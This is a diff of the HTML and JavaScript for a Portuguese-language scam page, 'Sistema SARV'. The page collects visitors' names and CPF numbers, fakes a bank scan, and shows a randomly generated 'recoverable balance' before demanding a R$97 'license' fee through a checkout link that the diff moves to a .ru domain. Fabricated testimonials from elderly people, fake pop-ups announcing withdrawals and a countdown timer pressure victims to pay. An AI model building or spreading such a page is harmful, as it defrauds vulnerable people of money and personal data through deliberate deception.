@@ -66,8 +66,6 @@
         #notification-box { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #fff; border-radius: 12px; padding: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 12px; z-index: 1000; transform: translateY(150%); transition: 0.5s ease; border-left: 5px solid var(--secondary); max-width: 400px; margin: 0 auto; }
         #notification-box.show { transform: translateY(0); }
         .notif-img { width: 40px; height: 40px; border-radius: 50%; background: #eee; object-fit: cover; }
-        .notif-text b { font-size: 12px; display: block; color: #111; }
-        .notif-text span { font-size: 11px; color: var(--secondary); font-weight: 700; }
 
         .loader-circle { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid var(--primary); border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -141,25 +139,21 @@
                     <div class="val-rec">+R$ 2.340,00</div>
                     <p class="depo-text">"Fiquei com medo no começo, achei que era golpe. Mas minha filha me ajudou a fazer e caiu R$ 2.340,00 do Bradesco que eu nem sabia que tinha. Deus abençoe esse moço Roberto."</p>
                 </div>
-
                 <div class="card-depo">
                     <div class="depo-header"><b>Seu Antônio, 68 anos</b> <span>Recife - PE</span></div>
                     <div class="val-rec">+R$ 3.120,00</div>
                     <p class="depo-text">"Trabalhei 40 anos de carteira assinada. O scanner achou R$ 3.120,00 que tava parado. Caiu no PIX em 12 minutos como prometido."</p>
                 </div>
-
                 <div class="card-depo">
                     <div class="depo-header"><b>Marcos Oliveira, 45 anos</b> <span>Osasco - SP</span></div>
                     <div class="val-rec">+R$ 1.890,00</div>
                     <p class="depo-text">"Paguei a licença e o valor caiu na hora. O estorno dos 97 reais veio junto no mesmo PIX. Vale a pena."</p>
                 </div>
-
                 <div class="card-depo">
                     <div class="depo-header"><b>Fernanda Souza, 38 anos</b> <span>Curitiba - PR</span></div>
                     <div class="val-rec">+R$ 2.765,00</div>
                     <p class="depo-text">"Sistema muito fácil de usar. Achei dinheiro de uma conta que fechei em 2018. Muito obrigada!"</p>
                 </div>
-
                 <div class="card-depo">
                     <div class="depo-header"><b>Ricardo Mendes, 54 anos</b> <span>Vitória - ES</span></div>
                     <div class="val-rec">+R$ 1.250,00</div>
@@ -205,7 +199,6 @@
                         <div class="bank-item"><span>Mercado Pago</span> <small>aguardando</small></div>
                     </div>
                 </div>
-                <p style="font-size: 11px; color: #999; margin-top: 15px;">🔒 Conexão segura · Não saia desta página.</p>
             </div>
         </div>
 
@@ -223,14 +216,6 @@
                 <div class="result-card">
                     <span style="font-size: 12px; font-weight: 800; color: var(--secondary); text-transform: uppercase;">💰 Saldo total disponível</span>
                     <h3 id="f-money">R$ 0,00</h3>
-                    <p style="font-size: 12px; color: var(--secondary); font-weight: 800;">Pronto para saque via PIX imediato</p>
-                </div>
-
-                <div style="font-size: 13px; background: #f8fafc; padding: 15px; border-radius: 15px; margin-bottom: 20px; border: 1px solid #eee;">
-                    <div style="display:flex; justify-content:space-between; padding: 5px 0;"><span>Bancos verificados:</span><b>14 instituições</b></div>
-                    <div style="display:flex; justify-content:space-between; padding: 5px 0;"><span>Origem do saldo:</span><b>Tarifas indevidas</b></div>
-                    <div style="display:flex; justify-content:space-between; padding: 5px 0;"><span>Liberação:</span><b style="color:var(--secondary)">Aprovada ✓</b></div>
-                    <div style="display:flex; justify-content:space-between; padding: 5px 0;"><span>Forma de saque:</span><b>PIX (na hora)</b></div>
                 </div>
 
                 <h3 style="color: #ff0000; font-size: 18px; font-weight: 900; text-align: center; margin-bottom: 15px;">⚠️ ÚLTIMA ETAPA: ATIVAÇÃO DA LICENÇA</h3>
@@ -243,25 +228,17 @@
                 <div style="background: #fff; border: 2px solid var(--secondary); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 25px;">
                     <span style="font-size: 12px; color: #999; text-decoration: line-through;">De R$ 297,00</span>
                     <div style="font-size: 38px; font-weight: 900; color: var(--secondary);">R$ 97,00</div>
-                    <p style="font-size: 11px; font-weight: 800; color: #444; margin-top: 5px;">PAGAMENTO ÚNICO · LIBERA O SAQUE + ESTORNO</p>
-                    
                     <div style="display:flex; justify-content: space-around; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee;">
                         <div><span style="display:block; font-size: 10px; color: #999;">Encerra em</span><b style="color:#ff0000" id="timer">05:00</b></div>
                         <div><span style="display:block; font-size: 10px; color: #999;">Vagas hoje</span><b>2</b></div>
                     </div>
                 </div>
 
-                <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-main" style="text-decoration: none; display: block; text-align: center; font-size: 18px;">🔓 LIBERAR MEU SAQUE AGORA</a>
-
-                <div style="display: flex; justify-content: space-around; margin-top: 20px;">
-                    <div style="text-align: center;"><i class="fas fa-bolt" style="color: #ffcc00;"></i><p style="font-size: 9px; font-weight: 800;">PIX NA HORA</p></div>
-                    <div style="text-align: center;"><i class="fas fa-shield-alt" style="color: var(--primary);"></i><p style="font-size: 9px; font-weight: 800;">100% SEGURO</p></div>
-                    <div style="text-align: center;"><i class="fas fa-mobile-alt" style="color: var(--secondary);"></i><p style="font-size: 9px; font-weight: 800;">ESTORNO TAXA</p></div>
-                </div>
+                <a href="https://checkoutseguro.ru/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-main" style="text-decoration: none; display: block; text-align: center; font-size: 18px;">🔓 LIBERAR MEU SAQUE AGORA</a>
 
                 <div class="roberto-box" style="margin-top: 25px; background: #fdfdfd; border-color: var(--primary);">
                      <p style="font-size: 14px; color: #111; line-height: 1.6; font-weight: 600;">
-                        <b>Recado do Roberto:</b> "<span class="u-nome"></span>, essa é a nossa última chamada. O sistema bancário tenta bloquear esses saques todos os dias. Garanta sua licença agora, receba seus <b class="f-money-txt"></b> e tenha os 97 reais devolvidos no mesmo PIX. É o seu direito como cidadão."
+                        <b>Recado do Roberto:</b> "<span class="u-nome"></span>, essa é a nossa última chamada. Garanta sua licença agora, receba seus <b class="f-money-txt"></b> e tenha os 97 reais devolvidos no mesmo PIX. É o seu direito."
                     </p>
                 </div>
             </div>
@@ -269,17 +246,16 @@
 
         <footer class="footer">
             Sistema SARV TECNOLOGIA LTDA<br>
-            CNPJ: 42.184.291/0001-08<br>
-            Avenida Paulista, 1106 - Bela Vista, São Paulo - SP<br><br>
+            CNPJ: 42.184.291/0001-08<br><br>
             © 2026 Sistema SARV — Todos os direitos reservados.
         </footer>
     </div>
 
     <div id="notification-box">
-        <img src="https://i.pravatar.cc/100?u=user1" class="notif-img" id="notif-img">
+        <img src="" class="notif-img" id="notif-img">
         <div class="notif-text">
-            <b id="notif-name">Carlos S. acabou de sacar</b>
-            <span id="notif-val">R$ 2.450,00 via PIX</span>
+            <b id="notif-name"></b>
+            <span id="notif-val"></span>
         </div>
     </div>
 
@@ -305,27 +281,22 @@
             const val = (Math.random() * (3256 - 1100) + 1100).toLocaleString('pt-BR', {minimumFractionDigits: 2});
             document.getElementById('notif-name').innerText = `${user.n} de ${user.c}`;
             document.getElementById('notif-val').innerText = `Acabou de sacar R$ ${val} via PIX`;
-            
-            // Foto condizente com gênero (m/f)
             const seed = user.g === "m" ? "male" : "female";
             document.getElementById('notif-img').src = `https://xsgames.co/randomusers/avatar.php?g=${seed}&sig=${Math.random()}`;
-            
             const box = document.getElementById('notification-box');
             box.classList.add('show');
             setTimeout(() => box.classList.remove('show'), 4000);
         }
-        setInterval(showNotification, 12000); // Aumentado para 12 segundos
+        setInterval(showNotification, 12000);
 
         function startScanner() {
             const nome = document.getElementById('nome').value;
             const cpf = document.getElementById('cpf').value;
             if(!nome || cpf.length < 14) { alert("Preencha os dados corretamente!"); return; }
-
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
             document.querySelectorAll('.u-nome').forEach(el => el.innerText = nome.split(' ')[0]);
             document.getElementById('u-cpf').innerText = cpf;
-
             const bItems = document.querySelectorAll('.bank-item');
             let idx = 0;
             const timer = setInterval(() => {
@@ -345,9 +316,8 @@
         }
 
         function showResult() {
-            const min = 1100;
-            const max = 3256;
-            const sorteio = (Math.random() * (max - min) + min).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            const min = 1100; const max = 3256;
+            const sorteio = (Math.random() * (max - min) + min).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
             document.getElementById('f-money').innerText = "R$ " + sorteio;
             document.querySelectorAll('.f-money-txt').forEach(el => el.innerText = "R$ " + sorteio);
             document.getElementById('f-cpf').innerText = "CPF: " + document.getElementById('cpf').value;
@@ -355,11 +325,10 @@
             document.getElementById('step-3').style.display = 'block';
             window.scrollTo(0,0);
             let dur = 300;
-            const count = setInterval(() => {
-                let m = Math.floor(dur/60);
-                let s = dur%60;
+            setInterval(() => {
+                let m = Math.floor(dur/60); let s = dur%60;
                 document.getElementById('timer').innerText = `0${m}:${s < 10 ? '0'+s : s}`;
-                if(--dur < 0) clearInterval(count);
+                if(--dur < 0) dur = 0;
             }, 1000);
         }
     </script>
